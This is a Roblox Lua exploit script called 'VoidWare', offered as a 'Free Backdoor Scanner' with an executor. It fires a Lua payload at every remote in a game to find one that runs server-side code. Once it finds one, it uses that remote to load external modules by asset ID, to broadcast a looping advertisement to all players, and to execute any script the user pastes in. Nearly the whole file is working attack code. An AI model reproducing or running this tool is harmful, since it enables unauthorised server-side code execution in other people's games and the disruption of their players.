local CollectionService = game:GetService("CollectionService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local G2L = {}

local scanningGUI = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
scanningGUI.Name = "VoidWareScanner"
scanningGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
scanningGUI.ResetOnSpawn = false

CollectionService:AddTag(scanningGUI, "main")

local VoidWare_2 = Instance.new("Frame", scanningGUI)
VoidWare_2.BorderSizePixel = 0
VoidWare_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VoidWare_2.Size = UDim2.new(0.46186, 0, 0.65643, 0)
VoidWare_2.Position = UDim2.new(0.26907, 0, 0.17179, 0)
VoidWare_2.Name = "VoidWare"

local UICorner_3 = Instance.new("UICorner", VoidWare_2)
UICorner_3.CornerRadius = UDim.new(0, 8)

local UIStroke_a = Instance.new("UIStroke", VoidWare_2)
UIStroke_a.Color = Color3.fromRGB(138, 0, 255)
UIStroke_a.Thickness = 2

local TextLabel_6 = Instance.new("TextLabel", VoidWare_2)
TextLabel_6.TextWrapped = true
TextLabel_6.BorderSizePixel = 0
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_6.TextScaled = true
TextLabel_6.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_6.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel_6.TextColor3 = Color3.fromRGB(153, 0, 255)
TextLabel_6.Size = UDim2.new(0.98958, 0, 0.12931, 0)
TextLabel_6.Text = "VoidWare"
TextLabel_6.Position = UDim2.new(0, 2, 0, 2)
TextLabel_6.ZIndex = 2

local UICorner_7 = Instance.new("UICorner", TextLabel_6)
UICorner_7.CornerRadius = UDim.new(0, 6)

local TextButton_8 = Instance.new("TextButton", VoidWare_2)
TextButton_8.TextWrapped = true
TextButton_8.BorderSizePixel = 0
TextButton_8.TextScaled = true
TextButton_8.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_8.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
TextButton_8.Size = UDim2.new(0.07813, 0, 0.12931, 0)
TextButton_8.Text = "×"
TextButton_8.Position = UDim2.new(0, 352, 0, 2)
TextButton_8.ZIndex = 2

local UICorner_9 = Instance.new("UICorner", TextButton_8)
UICorner_9.CornerRadius = UDim.new(0, 6)

local TextButton2_4 = Instance.new("TextButton", VoidWare_2)
TextButton2_4.TextWrapped = true
TextButton2_4.BorderSizePixel = 0
TextButton2_4.TextSize = 36
TextButton2_4.TextColor3 = Color3.fromRGB(138, 0, 255)
TextButton2_4.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
TextButton2_4.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextButton2_4.Size = UDim2.new(0.99479, 0, 0.83621, 0)
TextButton2_4.Text = "Scan for backdoor"
TextButton2_4.Name = "TextButton2"
TextButton2_4.Position = UDim2.new(0, 2, 0, 36)

local UICorner_5 = Instance.new("UICorner", TextButton2_4)
UICorner_5.CornerRadius = UDim.new(0, 8)

local StatusLabel = Instance.new("TextLabel", VoidWare_2)
StatusLabel.TextWrapped = true
StatusLabel.BorderSizePixel = 0
StatusLabel.TextSize = 14
StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
StatusLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
StatusLabel.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
StatusLabel.Size = UDim2.new(0.98958, 0, 0.08621, 0)
StatusLabel.Text = "Ready to scan..."
StatusLabel.Position = UDim2.new(0, 2, 0, 320)
StatusLabel.Name = "StatusLabel"

local UICorner_10 = Instance.new("UICorner", StatusLabel)
UICorner_10.CornerRadius = UDim.new(0, 4)

local executorGUI = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
executorGUI.Name = "VoidWareExecutor"
executorGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
executorGUI.Enabled = false
executorGUI.ResetOnSpawn = false

CollectionService:AddTag(executorGUI, "main")

local VoidWareExecutor_2 = Instance.new("Frame", executorGUI)
VoidWareExecutor_2.BorderSizePixel = 0
VoidWareExecutor_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
VoidWareExecutor_2.Size = UDim2.new(0.46186, 0, 0.65643, 0)
VoidWareExecutor_2.Position = UDim2.new(0.26907, 0, 0.17179, 0)
VoidWareExecutor_2.Name = "VoidWare"

local UICorner_7b = Instance.new("UICorner", VoidWareExecutor_2)
UICorner_7b.CornerRadius = UDim.new(0, 8)

local UIStroke_10 = Instance.new("UIStroke", VoidWareExecutor_2)
UIStroke_10.Color = Color3.fromRGB(138, 0, 255)
UIStroke_10.Thickness = 2

local TextLabel_a = Instance.new("TextLabel", VoidWareExecutor_2)
TextLabel_a.TextWrapped = true
TextLabel_a.BorderSizePixel = 0
TextLabel_a.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_a.TextScaled = true
TextLabel_a.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextLabel_a.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel_a.TextColor3 = Color3.fromRGB(153, 0, 255)
TextLabel_a.Size = UDim2.new(0.98958, 0, 0.12931, 0)
TextLabel_a.Text = "VoidWare Executor"
TextLabel_a.Position = UDim2.new(0, 2, 0, 2)
TextLabel_a.ZIndex = 2

local UICorner_b = Instance.new("UICorner", TextLabel_a)
UICorner_b.CornerRadius = UDim.new(0, 6)

local TextButton_8b = Instance.new("TextButton", VoidWareExecutor_2)
TextButton_8b.TextWrapped = true
TextButton_8b.BorderSizePixel = 0
TextButton_8b.TextScaled = true
TextButton_8b.TextColor3 = Color3.fromRGB(255, 0, 0)
TextButton_8b.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
TextButton_8b.Size = UDim2.new(0.07813, 0, 0.12931, 0)
TextButton_8b.Text = "×"
TextButton_8b.Position = UDim2.new(0, 352, 0, 2)
TextButton_8b.ZIndex = 2

local UICorner_9b = Instance.new("UICorner", TextButton_8b)
UICorner_9b.CornerRadius = UDim.new(0, 6)

local TextBox_f = Instance.new("TextBox", VoidWareExecutor_2)
TextBox_f.CursorPosition = -1
TextBox_f.TextXAlignment = Enum.TextXAlignment.Left
TextBox_f.PlaceholderColor3 = Color3.fromRGB(149, 149, 149)
TextBox_f.BorderSizePixel = 0
TextBox_f.TextSize = 18
TextBox_f.TextYAlignment = Enum.TextYAlignment.Top
TextBox_f.BackgroundColor3 = Color3.fromRGB(19, 19, 19)
TextBox_f.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextBox_f.PlaceholderText = "Paste your script here..."
TextBox_f.Size = UDim2.new(0.97917, 0, 0.67241, 0)
TextBox_f.Position = UDim2.new(0, 4, 0, 36)
TextBox_f.Text = ""
TextBox_f.ClearTextOnFocus = false

local UICorner_11 = Instance.new("UICorner", TextBox_f)
UICorner_11.CornerRadius = UDim.new(0, 6)

local Exe_5 = Instance.new("TextButton", VoidWareExecutor_2)
Exe_5.BorderSizePixel = 0
Exe_5.TextSize = 24
Exe_5.TextColor3 = Color3.fromRGB(112, 10, 255)
Exe_5.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Exe_5.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Exe_5.Size = UDim2.new(0.20833, 0, 0.14655, 0)
Exe_5.Text = "Execute"
Exe_5.Name = "Exe"
Exe_5.Position = UDim2.new(0, 4, 0, 196)

local UICorner_6 = Instance.new("UICorner", Exe_5)
UICorner_6.CornerRadius = UDim.new(0, 6)

local Clear_3 = Instance.new("TextButton", VoidWareExecutor_2)
Clear_3.BorderSizePixel = 0
Clear_3.TextSize = 24
Clear_3.TextColor3 = Color3.fromRGB(112, 10, 255)
Clear_3.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Clear_3.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Clear_3.Size = UDim2.new(0.20833, 0, 0.14655, 0)
Clear_3.Text = "Clear"
Clear_3.Name = "Clear"
Clear_3.Position = UDim2.new(0, 88, 0, 196)

local UICorner_4 = Instance.new("UICorner", Clear_3)
UICorner_4.CornerRadius = UDim.new(0, 6)

local Sens_d = Instance.new("TextButton", VoidWareExecutor_2)
Sens_d.BorderSizePixel = 0
Sens_d.TextSize = 18
Sens_d.TextColor3 = Color3.fromRGB(255, 0, 0)
Sens_d.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
Sens_d.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
Sens_d.Size = UDim2.new(0.38021, 0, 0.14655, 0)
Sens_d.Text = "Sensation Hub"
Sens_d.Name = "Sens"
Sens_d.Position = UDim2.new(0, 172, 0, 196)

local UICorner_e = Instance.new("UICorner", Sens_d)
UICorner_e.CornerRadius = UDim.new(0, 6)

local TextLabel2_c = Instance.new("TextLabel", VoidWareExecutor_2)
TextLabel2_c.TextWrapped = true
TextLabel2_c.BorderSizePixel = 0
TextLabel2_c.TextSize = 16
TextLabel2_c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2_c.FontFace = Font.new("rbxasset://fonts/families/Zekton.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
TextLabel2_c.TextColor3 = Color3.fromRGB(50, 255, 0)
TextLabel2_c.BackgroundTransparency = 1
TextLabel2_c.RichText = true
TextLabel2_c.Size = UDim2.new(0.15625, 0, 0.12931, 0)
TextLabel2_c.Text = "Made by StarFlow"
TextLabel2_c.Name = "TextLabel2"
TextLabel2_c.Position = UDim2.new(0, 320, 0, 198)

local backdoor = nil
local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}

local function createTween(object, properties, duration)
    local tweenInfo = TweenInfo.new(duration or 0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local tween = TweenService:Create(object, tweenInfo, properties)
    tween:Play()
    return tween
end

local function generateName(length)
    local text = ''
    for i = 1, length do
        text = text .. alphabet[math.random(1,#alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

local function updateStatus(message, color)
    StatusLabel.Text = message
    StatusLabel.TextColor3 = color or Color3.fromRGB(200, 200, 200)
end

local function findRemote()
    local remotes = {}
    updateStatus("Starting scan...", Color3.fromRGB(255, 255, 0))
    
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        local code = generateName(math.random(12,30))
        spawn(function() 
            protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
        end)
        remotes[code] = protected_backdoor
    end
    
    for i,remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
            continue 
        end

        if string.split(remote:GetFullName(), '.')[1]=='RobloxReplicatedStorage' then
            continue
        end

        if remote.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent==game:GetService("ReplicatedStorage") or remote.Parent.Parent.Parent==game:GetService("ReplicatedStorage") then
            if remote:FindFirstChild('__FUNCTION') or remote.Name=='__FUNCTION' then
                continue
            end

            if remote.Parent.Parent.Name=='HDAdminClient' and remote.Parent.Name=='Signals' then
                continue
            end

            if remote.Parent.Name=='DefaultChatSystemChatEvents' then
                continue
            end
        end

        local code = generateName(math.random(12,30))
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        updateStatus("Scanning... "..i.."%", Color3.fromRGB(255, 255, 0))
        for code,remote in remotes do
            if workspace:FindFirstChild(code) then
                backdoor = remote
                scanningGUI.Enabled = false
                executorGUI.Enabled = true

                runRemote(remote, "require(171016405.1884*69)")            
                runRemote(remote, "a=Instance.new('Hint')a.Text='VoidWare | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                
                updateStatus("Backdoor found!", Color3.fromRGB(0, 255, 0))
                return true
            end
        end
        task.wait(0.05)
    end

    updateStatus("No backdoor found", Color3.fromRGB(255, 0, 0))
    return false
end

local function buttonClickEffect(button)
    createTween(button, {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}, 0.1)
    task.wait(0.1)
    createTween(button, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.1)
end

TextButton2_4.MouseButton1Click:Connect(function()
    TextButton2_4.Text = "Scanning..."
    TextButton2_4.TextColor3 = Color3.fromRGB(255, 255, 0)
    buttonClickEffect(TextButton2_4)
    
    spawn(function()
        if not findRemote() then
            TextButton2_4.Text = "Scan for backdoor"
            TextButton2_4.TextColor3 = Color3.fromRGB(138, 0, 255)
        end
    end)
end)

Exe_5.MouseButton1Click:Connect(function()
    local scriptText = TextBox_f.Text
    if backdoor and scriptText ~= "" then
        runRemote(backdoor, scriptText)
        Exe_5.Text = "Executed!"
        buttonClickEffect(Exe_5)
        task.wait(0.5)
        Exe_5.Text = "Execute"
    else
        Exe_5.Text = "No script!"
        buttonClickEffect(Exe_5)
        task.wait(0.5)
        Exe_5.Text = "Execute"
    end
end)

Clear_3.MouseButton1Click:Connect(function()
    TextBox_f.Text = ""
    Clear_3.Text = "Cleared!"
    buttonClickEffect(Clear_3)
    task.wait(0.5)
    Clear_3.Text = "Clear"
end)

Sens_d.MouseButton1Click:Connect(function()
    if backdoor then
        local playerName = Players.LocalPlayer.Name
        runRemote(backdoor, "require(100263845596551)('"..playerName.."')")
        Sens_d.Text = "Loaded!"
        buttonClickEffect(Sens_d)
        task.wait(0.5)
        Sens_d.Text = "Sensation Hub"
    end
end)

TextButton_8.MouseButton1Click:Connect(function()
    createTween(VoidWare_2, {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
    task.wait(0.3)
    scanningGUI:Destroy()
end)

TextButton_8b.MouseButton1Click:Connect(function()
    createTween(VoidWareExecutor_2, {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
    task.wait(0.3)
    executorGUI:Destroy()
end)

TextBox_f.Focused:Connect(function()
    createTween(TextBox_f, {BackgroundColor3 = Color3.fromRGB(25, 25, 25)}, 0.2)
end)

TextBox_f.FocusLost:Connect(function()
    createTween(TextBox_f, {BackgroundColor3 = Color3.fromRGB(19, 19, 19)}, 0.2)
end)

TextButton2_4.MouseEnter:Connect(function()
    createTween(TextButton2_4, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}, 0.2)
end)

TextButton2_4.MouseLeave:Connect(function()
    createTween(TextButton2_4, {BackgroundColor3 = Color3.fromRGB(24, 24, 24)}, 0.2)
end)

Exe_5.MouseEnter:Connect(function()
    createTween(Exe_5, {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}, 0.2)
end)

Exe_5.MouseLeave:Connect(function()
    createTween(Exe_5, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.2)
end)

Clear_3.MouseEnter:Connect(function()
    createTween(Clear_3, {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}, 0.2)
end)

Clear_3.MouseLeave:Connect(function()
    createTween(Clear_3, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.2)
end)

Sens_d.MouseEnter:Connect(function()
    createTween(Sens_d, {BackgroundColor3 = Color3.fromRGB(35, 35, 35)}, 0.2)
end)

Sens_d.MouseLeave:Connect(function()
    createTween(Sens_d, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.2)
end)

TextButton_8.MouseEnter:Connect(function()
    createTween(TextButton_8, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
end)

TextButton_8.MouseLeave:Connect(function()
    createTween(TextButton_8, {BackgroundColor3 = Color3.fromRGB(48, 48, 48)}, 0.2)
end)

TextButton_8b.MouseEnter:Connect(function()
    createTween(TextButton_8b, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
end)

TextButton_8b.MouseLeave:Connect(function()
    createTween(TextButton_8b, {BackgroundColor3 = Color3.fromRGB(48, 48, 48)}, 0.2)
end)

return scanningGUI